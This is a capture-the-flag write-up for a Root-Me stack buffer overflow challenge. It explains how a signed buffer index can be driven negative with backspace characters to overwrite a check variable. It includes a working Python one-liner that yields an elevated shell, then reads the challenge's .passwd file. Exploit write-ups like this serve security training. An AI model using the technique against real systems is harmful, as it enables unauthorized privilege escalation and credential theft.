# ELF x86 - Stack buffer overflow basic 3 
https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-3
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 Yes 
NX 	Non-Executable Stack 	                 Yes 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch16@challenge02.root-me.org   
Username	app-systeme-ch16
Password	app-systeme-ch16
```
The source code is available and it's pretty clear that one can control the index of the buffer (_count_) at each character entered.<br>
The problem is that the buffer is growing upwards (to higher addresses), while the stack grows downwards (to lower addresses). So we'll not be able to overwrite the _check_ variable just like that.<br>
Luckily, _count_ is a signed integer, which means it can be negative. So, because we can increase the count (using any character which is not '\x08') and **decrease** it (using the '\x08' character).<br>
After trying to decrease count to -4 so _buffer[count]_ will point to _check_ (hopefully), one can get the following output:

```sh
app-systeme-ch16@challenge02:~$ cat <(python -c 'print "\x08"*4+"\xbc\xfa\xff\xbf"') - | ./ch16
Enter your name: id
uid=1116(app-systeme-ch16) gid=1116(app-systeme-ch16) euid=1216(app-systeme-ch16-cracked) groups=1216(app-systeme-ch16-cracked),100(users),1116(app-systeme-ch16)
cat .passwd
<censored>
```
